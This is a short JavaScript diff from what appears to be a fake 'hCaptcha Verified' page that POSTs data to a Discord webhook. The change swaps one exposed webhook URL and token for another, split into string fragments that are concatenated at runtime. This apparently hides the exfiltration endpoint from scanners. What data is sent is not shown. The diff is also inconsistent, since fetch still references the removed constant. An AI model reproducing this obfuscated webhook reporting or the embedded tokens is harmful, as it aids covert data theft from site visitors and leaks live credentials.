@@ -113,7 +113,14 @@
           footer: { text: "hCaptcha Verified" }
         }]
       };
-      const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1364031300473851924/qGjv5xvrIexTwzHqBm5_I3OsCii5WDY9oe2BrcWVTN_sCLoiO3-eMTxuXtMV0TKwjW-o";
+
+    const part1 = "https://discord.com/";
+    const part2 = "api/";
+    const part3 = "webhooks/";
+    const part4 = "1386399224899309719/";
+    const part5 = "BmgGK3vuCt4A8KhCrPCt17WOKduQEMb9Kb0KIB4NvIFSwkr9Hs6pt9-mEMLC5uUwU-Fy";
+
+    const discordWebhookURL = part1 + part2 + part3 + part4 + part5;
       try {
         const response = await fetch(DISCORD_WEBHOOK_URL, {
           method: "POST",
